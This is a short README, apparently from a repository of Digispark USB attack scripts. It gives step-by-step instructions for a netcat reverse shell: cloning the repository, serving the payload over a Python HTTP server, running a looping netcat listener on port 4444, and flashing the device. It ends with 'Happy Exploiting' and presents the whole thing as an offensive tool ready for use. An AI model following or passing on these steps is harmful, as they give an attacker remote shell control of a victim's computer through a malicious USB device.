## How to use this reverse shell payload

1. `git clone https://github.com/Samuel20354/Digispark_scripts`
2. `cd Digispark_scripts/Reverse Shell (NetCat)`
3. `python -m SimpleHTTPServer 8000`
4. Open a new ternimal window then:
5. `while true; do nc -l -p 4444; done`
6. Put the new digispark code onto it and done! Happy Exploiting